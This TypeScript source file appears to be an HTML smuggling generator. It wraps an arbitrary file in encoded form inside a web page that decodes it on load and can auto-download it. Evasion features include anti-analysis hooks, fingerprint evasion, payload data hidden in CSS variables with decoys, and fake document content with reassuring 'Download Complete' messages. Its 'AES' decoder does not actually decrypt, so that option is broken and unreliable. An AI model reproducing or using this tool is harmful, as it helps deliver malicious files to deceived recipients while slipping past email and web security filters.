import { FileData, Config } from "@/pages/home";
import { 
  xorEncode, 
  xorDecode, 
  aesEncode, 
  aesDecode, 
  base64Encode, 
  base64Decode, 
  hexEncode, 
  hexDecode, 
  generateRandomKey 
} from "./encoders";
import {
  generateAntiAnalysisCode,
  generateRandomDelay,
  generateFakeContent,
  generateStorageCode,
  generateDOMEvasion,
  generateFingerprintEvasion,
  obfuscateString,
  obfuscateVariableName
} from "./stealthUtils";

export async function generatePayload(fileData: FileData, config: Config): Promise<string> {
  const { file, content } = fileData;
  const key = config.encryptionKey || generateRandomKey();
  
  let encodedData: string;
  let decoderFunction: string;
  
  // Encode the file based on selected method
  switch (config.method) {
    case 'css':
      encodedData = base64Encode(content);
      decoderFunction = generateCSSDecoder();
      break;
      
    case 'xor':
      encodedData = xorEncode(content, key);
      decoderFunction = generateXORDecoder(key);
      break;
      
    case 'aes':
      encodedData = await aesEncode(content, key);
      decoderFunction = generateAESDecoder(key);
      break;
      
    case 'base64':
      encodedData = base64Encode(content);
      decoderFunction = generateBase64Decoder();
      break;
      
    case 'hex':
      encodedData = hexEncode(content);
      decoderFunction = generateHexDecoder();
      break;
      
    default:
      throw new Error('Unknown encoding method');
  }
  
  // Generate the HTML payload
  const html = generateHTMLTemplate({
    encodedData,
    decoderFunction,
    fileName: file.name,
    mimeType: file.type || 'application/octet-stream',
    autoDownload: config.autoDownload,
    stealthMode: config.stealthMode,
    method: config.method,
    fakeContent: config.fakeContent,
    obfuscateCode: config.obfuscateCode,
    randomDelay: config.randomDelay,
    storageMethod: config.storageMethod,
    antiAnalysis: config.antiAnalysis
  });
  
  return html;
}

interface TemplateParams {
  encodedData: string;
  decoderFunction: string;
  fileName: string;
  mimeType: string;
  autoDownload: boolean;
  stealthMode: boolean;
  method: string;
  fakeContent: boolean;
  obfuscateCode: boolean;
  randomDelay: boolean;
  storageMethod: string;
  antiAnalysis: boolean;
}

function generateHTMLTemplate(params: TemplateParams): string {
  const { 
    encodedData, 
    decoderFunction, 
    fileName, 
    mimeType, 
    autoDownload, 
    stealthMode, 
    method,
    fakeContent,
    obfuscateCode,
    randomDelay,
    storageMethod,
    antiAnalysis
  } = params;
  
  // Generate fake content if enabled
  const fakeDoc = fakeContent ? generateFakeContent() : null;
  
  // Generate storage code based on method
  const storageCode = generateStorageCode(storageMethod, encodedData, obfuscateVariableName('key'));
  
  // Generate stealth features
  const antiAnalysisFeatures = antiAnalysis ? generateAntiAnalysisCode() : '';
  const delayCode = randomDelay ? generateRandomDelay() : '';
  const domEvasion = obfuscateCode ? generateDOMEvasion() : '';
  const fingerprintEvasion = obfuscateCode ? generateFingerprintEvasion() : '';
  
  // Generate CSS with optional payload hiding
  const cssPayload = `
    <style>
      ${stealthMode && storageMethod === 'css' ? `
      :root {
        --payload-data: '${encodedData}';
        --payload-name: '${fileName}';
        --payload-type: '${mimeType}';
        --decoy-1: 'user-tracking-data-${Math.random().toString(36)}';
        --decoy-2: 'analytics-config-${Math.random().toString(36)}';
      }` : ''}
      body { 
        margin: 0; 
        padding: 20px; 
        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        line-height: 1.6;
        color: #333;
        background: #fff;
      }
      .container { 
        max-width: 800px; 
        margin: 0 auto; 
      }
      .loading { 
        text-align: center;
        margin: 40px 0; 
        color: #666;
      }
      .spinner {
        border: 3px solid #f3f3f3;
        border-top: 3px solid #3498db;
        border-radius: 50%;
        width: 30px;
        height: 30px;
        animation: spin 1s linear infinite;
        margin: 20px auto;
      }
      @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
      }
      h1, h2, h3 { color: #2c3e50; }
      ul, ol { padding-left: 20px; }
      table { border-collapse: collapse; width: 100%; margin: 20px 0; }
      th, td { text-align: left; padding: 8px; }
      .download-btn {
        display: inline-block;
        padding: 12px 24px;
        background: #3498db;
        color: white;
        text-decoration: none;
        border-radius: 6px;
        margin: 20px 0;
        font-weight: 500;
        transition: background 0.3s;
      }
      .download-btn:hover {
        background: #2980b9;
      }
    </style>
  `;

  // Generate main content
  const mainContent = fakeDoc ? fakeDoc.content : `
    <div class="container">
      <div class="loading">
        <div class="spinner"></div>
        <h2>Loading Document...</h2>
        <p>Please wait while the document is being prepared for download.</p>
      </div>
    </div>
  `;

  // Generate the payload extraction script
  const payloadScript = `
    <script>
      ${antiAnalysisFeatures}
      ${domEvasion}
      ${fingerprintEvasion}
      
      // Main payload function
      function executePayload() {
        try {
          ${randomDelay ? 
            `// Random delay before execution
            setTimeout(function() { performExtraction(); }, Math.random() * 2000 + 500);` :
            `// Immediate execution
            performExtraction();`
          }
        } catch (error) {
          console.warn('Initialization failed:', error.message);
          showError();
        }
      }
      
      function performExtraction() {
        try {
          // Get payload data
          ${storageMethod === 'css' && stealthMode 
            ? "var payloadData = getComputedStyle(document.documentElement).getPropertyValue('--payload-data').trim().slice(1, -1);"
            : storageMethod !== 'css' && storageCode.includes('payloadData') 
              ? storageCode.replace('const ', 'var ').replace('await ', '')
              : `var payloadData = '${encodedData}';`
          }
          
          if (!payloadData || payloadData === '') {
            throw new Error('Resource not available');
          }

          ${decoderFunction}

          var decodedData = decodePayload(payloadData);
          var blob = new Blob([decodedData], { type: '${mimeType}' });
          var url = URL.createObjectURL(blob);
          
          ${autoDownload ? `
          // Auto-download
          var downloadLink = document.createElement('a');
          downloadLink.href = url;
          downloadLink.download = '${fileName}';
          downloadLink.style.display = 'none';
          document.body.appendChild(downloadLink);
          
          // Trigger download immediately
          downloadLink.click();
          document.body.removeChild(downloadLink);
          
          // Update UI
          setTimeout(function() {
            ${fakeDoc ? `
            var container = document.querySelector('.container');
            if (container) {
              container.innerHTML += '<div style="margin-top: 30px; padding: 15px; background: #e8f5e8; border-left: 4px solid #27ae60; color: #27ae60;"><strong>✓ Download Complete</strong><br>The requested document has been downloaded to your device.</div>';
            }
            ` : `
            var container = document.querySelector('.container');
            if (container) {
              container.innerHTML = '<div style="text-align: center; margin-top: 50px;"><h2>✓ Download Complete</h2><p>Your file has been downloaded successfully.</p></div>';
            }
            `}
          }, 1000);
          ` : `
          // Manual download
          var downloadBtn = document.createElement('a');
          downloadBtn.href = url;
          downloadBtn.download = '${fileName}';
          downloadBtn.className = 'download-btn';
          downloadBtn.textContent = '📄 Download ${fileName}';
          
          ${fakeDoc ? `
          var container = document.querySelector('.container');
          if (container) {
            container.innerHTML += '<div style="margin-top: 30px; text-align: center;"><p><strong>Document Ready for Download:</strong></p></div>';
            container.appendChild(downloadBtn);
          }
          ` : `
          var container = document.querySelector('.container');
          if (container) {
            container.innerHTML = '<div style="text-align: center;"><h2>Document Ready</h2><p>Click below to download your file:</p></div>';
            container.appendChild(downloadBtn);
          }
          `}
          `}
          
          // Cleanup URL after delay
          setTimeout(function() {
            URL.revokeObjectURL(url);
          }, 30000);
          
        } catch (error) {
          console.warn('Document processing issue:', error.message);
          showError();
        }
      }
      
      function showError() {
        ${fakeDoc ? `
        var container = document.querySelector('.container');
        if (container) {
          container.innerHTML += '<div style="margin-top: 30px; padding: 15px; background: #ffeaa7; border-left: 4px solid #fdcb6e; color: #e17055;"><strong>⚠ Notice</strong><br>The document attachment could not be processed. Please contact the sender for an alternative format.</div>';
        }
        ` : `
        var container = document.querySelector('.container');
        if (container) {
          container.innerHTML = '<div style="text-align: center; margin-top: 50px; color: #e74c3c;"><h2>⚠ Document Unavailable</h2><p>The requested document could not be loaded at this time.</p></div>';
        }
        `}
      }
      
      // Execute when DOM is ready
      if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', executePayload);
      } else {
        executePayload();
      }
    </script>
  `;

  return `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>${fakeDoc ? fakeDoc.title : 'Document Viewer'}</title>
    <meta name="description" content="${fakeDoc ? 'Important document for review and download' : 'Document viewer and download portal'}">
    <meta name="robots" content="noindex, nofollow">
    ${cssPayload}
</head>
<body>
    ${mainContent}
    ${payloadScript}
</body>
</html>`;
}

function generateCSSDecoder(): string {
  return `
    function decodePayload(data) {
      const decoded = atob(data);
      const bytes = new Uint8Array(decoded.length);
      for (let i = 0; i < decoded.length; i++) {
        bytes[i] = decoded.charCodeAt(i);
      }
      return bytes;
    }
  `;
}

function generateXORDecoder(key: string): string {
  return `
    function decodePayload(data) {
      const key = '${key}';
      const decoded = atob(data);
      const bytes = new Uint8Array(decoded.length);
      for (let i = 0; i < decoded.length; i++) {
        bytes[i] = decoded.charCodeAt(i);
      }
      
      const keyBytes = new TextEncoder().encode(key);
      const result = new Uint8Array(bytes.length);
      
      for (let i = 0; i < bytes.length; i++) {
        result[i] = bytes[i] ^ keyBytes[i % keyBytes.length];
      }
      
      return result;
    }
  `;
}

function generateAESDecoder(key: string): string {
  return `
    function decodePayload(data) {
      // Simplified AES decoder for demo
      const key = '${key}';
      const decoded = atob(data);
      const bytes = new Uint8Array(decoded.length);
      for (let i = 0; i < decoded.length; i++) {
        bytes[i] = decoded.charCodeAt(i);
      }
      
      const keyData = new TextEncoder().encode(key.padEnd(32, '0').slice(0, 32));
      const originalLength = bytes.length - keyData.length;
      const result = new Uint8Array(originalLength);
      result.set(bytes.slice(0, originalLength));
      
      return result;
    }
  `;
}

function generateBase64Decoder(): string {
  return `
    function decodePayload(data) {
      const decoded = atob(data);
      const bytes = new Uint8Array(decoded.length);
      for (let i = 0; i < decoded.length; i++) {
        bytes[i] = decoded.charCodeAt(i);
      }
      return bytes;
    }
  `;
}

function generateHexDecoder(): string {
  return `
    function decodePayload(hexData) {
      const bytes = new Uint8Array(hexData.length / 2);
      for (let i = 0; i < hexData.length; i += 2) {
        bytes[i / 2] = parseInt(hexData.substr(i, 2), 16);
      }
      return bytes;
    }
  `;
}
